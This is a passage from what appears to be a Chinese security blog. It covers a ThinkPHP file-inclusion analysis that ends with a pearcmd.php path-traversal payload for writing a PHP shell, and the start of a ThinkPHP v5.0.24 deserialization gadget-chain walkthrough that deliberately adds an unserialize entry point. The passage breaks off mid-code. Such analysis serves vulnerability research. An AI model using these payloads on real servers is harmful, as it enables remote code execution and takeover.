class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$range</span> = <span class="string">&#x27;&#x27;</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$range</span> = <span class="variable">$range</span> ?: <span class="variable language_">$this</span>-&gt;range;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>])) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>] = [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$lang</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ((<span class="keyword">array</span>) <span class="variable">$file</span> <span class="keyword">as</span> <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse</span>(<span class="variable">$name</span>);</span><br><span class="line">            <span class="variable">$lang</span>   = <span class="title function_ invoke__">array_change_key_case</span>(<span class="variable">$result</span>) + <span class="variable">$lang</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$lang</span>)) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>] = <span class="variable">$lang</span> + <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断文件是否存在, 存在的话进入条件中 ,进一步又传入到<code>$this-&gt;parse($name)</code><br>进入到<code>parse()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parse</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$type</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;php&#x27;</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;yml&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;yaml&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;yaml_parse_file&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="title function_ invoke__">yaml_parse_file</span>(<span class="variable">$file</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;json&#x27;</span>:</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$data</span>) &#123;</span><br><span class="line">                    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$data</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">json_last_error</span>() === JSON_ERROR_NONE) &#123;</span><br><span class="line">                        <span class="variable">$result</span> = <span class="variable">$data</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$result</span>) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$result</span>) ? <span class="variable">$result</span> : [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>$type = pathinfo($file, PATHINFO_EXTENSION)</code>返回文件的扩展名<br>显然是<code>php</code><br>继续进入到 <code>$result = include $file</code> ,从而可以实现文件包含<br>从始至终都没有对传入的参数进行一个过滤</p><p>接下来就可以利用包含pearcmd.php进行rce了</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>当开启register_argc_argv时，提交的参数都会传入 $_SERVER[‘argv’]变量内</p><p><img src="/886208_CJWJ8H3VV8WA4EF.jpg" alt="img"></p><p>&amp;无法分割参数，会被当作一个整体。等号也无法赋值，会被直接传进参数</p><p>当使用+号分割，将会作为数组，而pear执行是通过 readPHPArgv()来获取argv内容。<br><img src="/886208_M3QAKURKYMMT7K3.jpg" alt="img"></p><h2 id="利用pearcmd-php进行命令执行"><a href="#利用pearcmd-php进行命令执行" class="headerlink" title="利用pearcmd.php进行命令执行"></a>利用pearcmd.php进行命令执行</h2><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+shell.php</span><br></pre></td></tr></table></figure><p><a href="https://bbs.kanxue.com/thread-276704.htm">https://bbs.kanxue.com/thread-276704.htm</a></p><p><a href="https://tttang.com/archive/1865/#toc__3">https://tttang.com/archive/1865/#toc__3</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP v5.0.24 反序列化</title>
      <link href="/2024/08/02/tp-V5.0.24/"/>
      <url>/2024/08/02/tp-V5.0.24/</url>
      
        <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>源码下载完成之后，因为并不存在反序列化入口，所以需要手动添加</p><p>在<code>application\index\controller\Index.php</code>中修改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$payload</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$payload</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/08/02/tp-V5.0.24/image-20240802013552618.png" alt="image-20240802013552618"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li><p>在 PHP 中，<code>file_exists</code> 函数会在检查文件路径时将传递的参数转换为字符串。由于这个转换行为，它会触发对象的 <code>__toString</code> 方法。</p></li><li><p><code>method_exists</code> 是 PHP 中的一个内置函数，用于检查某个类或对象是否存在某个方法</p></li><li><p>抽象类是一种特殊的类, 不能被实例化, 只能被继承, 可以包含抽象方法和非抽象方法, 子类必须实现抽象方法,不然会报错 , 使用抽象类需要实例化它的子类</p></li></ul><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="从Windows-php-类的-destruct-开始寻找"><a href="#从Windows-php-类的-destruct-开始寻找" class="headerlink" title="从Windows.php 类的 --destruct() 开始寻找"></a>从Windows.php 类的 <code>--destruct()</code> 开始寻找</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="跟着去寻找-removeFiles"><a href="#跟着去寻找-removeFiles" class="headerlink" title="跟着去寻找 removeFiles()"></a>跟着去寻找 <code>removeFiles()</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>存在 <code>file_exists() </code>  可以调用到类对象的 <code>__toString()</code> 方法<br>搜索一下哪些类里面使用了 <code>__toString() </code> 方法<br>可以找到很多的类, 选择  <code>Model.php </code> </p><p><img src="/2024/08/02/tp-V5.0.24/image-20240731223755681.png" alt="image-20240731223755681"></p><p>Model.php中定义了一个抽象类<code>Model</code>，所以我们需要找到一个它的子类， 有两个子类 <code>Merge</code>和<code>Pivot</code><br>选择 <code>Pivot</code></p><h3 id="Model-php-的-toString"><a href="#Model-php-的-toString" class="headerlink" title="Model.php  的  __toString()"></a>Model.php  的  <code>__toString()</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="继续跟着寻找-toJson"><a href="#继续跟着寻找-toJson" class="headerlink" title="继续跟着寻找 toJson()"></a>继续跟着寻找 <code>toJson()</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="继续跟着寻找-toArray"><a href="#继续跟着寻找-toArray" class="headerlink" title="继续跟着寻找 toArray()"></a>继续跟着寻找 <code>toArray()</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>    = [];</span><br><span class="line">        <span class="variable">$visible</span> = [];</span><br><span class="line">        <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 过滤属性</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;visible)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseAttr</span>(<span class="variable">$this</span>-&gt;visible, <span class="variable">$visible</span>);</span><br><span class="line">            <span class="variable">$data</span>  = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="variable">$array</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseAttr</span>(<span class="variable">$this</span>-&gt;hidden, <span class="variable">$hidden</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$data</span>  = <span class="title function_ invoke__">array_diff_key</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="variable">$array</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">subToArray</span>(<span class="variable">$val</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; <span class="title function_ invoke__">reset</span>(<span class="variable">$val</span>) <span class="keyword">instanceof</span> Model) &#123;</span><br><span class="line">                <span class="comment">// 关联模型数据集</span></span><br><span class="line">                <span class="variable">$arr</span> = [];</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="variable">$arr</span>[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">subToArray</span>(<span class="variable">$value</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$arr</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 模型属性</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                        <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                        <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                            <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                                <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                    <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>912行可以看到 <code>$value</code> 调用了 <code>getAttr()</code> 方法, 最终的目的是通过 调用 <code>__call()</code> 方法实现写 shell, 如果 <code>$value</code> 可控,<br>就可以通过控制 <code>$value</code> 调用到 <code>__call()</code><br>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用, 控制 <code>$value</code> 为一个没有<code>getAttr()</code> 方法的对象</p><p><img src="/2024/08/02/tp-V5.0.24/image-20240731233610471.png" alt="image-20240731233610471"></p><h4 id="从if-empty-this-append-开始"><a href="#从if-empty-this-append-开始" class="headerlink" title="从if (!empty($this-&gt;append)) 开始"></a>从<code>if (!empty($this-&gt;append)) </code>开始</h4><p>首先要保证<code>$this→append</code>数组不为空, 然后要进入到第三个else语句中 , 需要满足</p><p><code>is_array($name) </code> –&gt;  <code> $name</code>不能为数组<br><code>strpos($name, &#39;.&#39;)</code> –&gt; <code> $name</code>的值中不含 <code>.</code>  </p><p>然后就是  <code>$relation = Loader::parseName($name, 1, false);</code></p><h4 id="进入到-parseName-方法"><a href="#进入到-parseName-方法" class="headerlink" title="进入到  parseName() 方法"></a>进入到  <code>parseName()</code> 方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseName</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$type</span> = <span class="number">0</span>, <span class="variable">$ucfirst</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">            <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/_([a-zA-Z])/&#x27;</span>, function (<span class="variable">$match</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$match</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ucfirst</span> ? <span class="title function_ invoke__">ucfirst</span>(<span class="variable">$name</span>) : <span class="title function_ invoke__">lcfirst</span>(<span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[A-Z]/&quot;</span>, <span class="string">&quot;_\\0&quot;</span>, <span class="variable">$name</span>), <span class="string">&quot;_&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是对传入的参数 进行两种命名方式的转变, 没有什么影响 (大小写的命名或者下划线的命名)</p><h4 id="然后是-method-exists-this-relation"><a href="#然后是-method-exists-this-relation" class="headerlink" title="然后是 method_exists($this, $relation)"></a>然后是 <code>method_exists($this, $relation)</code></h4><p>当前对象需要有 <code>$relation</code> 方法, 而 <code>$relation</code>其实就是<code>$name</code> , <code>$name</code> 就是<code>$this→append</code>的值 ,且<code>$append</code> 是可控的<br>所以就可以控制 <code>$relation</code> 为当前对象 <code>\think\Model</code> 拥有的方法,</p><h4 id="选择-getError-方法"><a href="#选择-getError-方法" class="headerlink" title="选择 getError() 方法"></a>选择 <code>getError()</code> 方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getError</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $this-&gt;error 可控</span></span><br></pre></td></tr></table></figure><p>此时 <code>$modelRelation</code> 是 <code>getError()</code> 的返回值, 可控</p><p>然后就是  <code>$value = $this-&gt;getRelationData($modelRelation)</code><br>我们需要控制 <code>$value</code> , <code>$value</code> 的值由<code>getRelationData()</code> 方法返回</p><p><img src="/2024/08/02/tp-V5.0.24/image-20240731234213516.png"></p><p>​</p><h4 id="跟进getRelationData-方法"><a href="#跟进getRelationData-方法" class="headerlink" title="跟进getRelationData() 方法"></a>跟进<code>getRelationData()</code> 方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span>(<span class="params">Relation <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">isSelfRelation</span>() &amp;&amp; <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>)) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 首先获取关联数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getRelation&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$value</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getRelation</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> 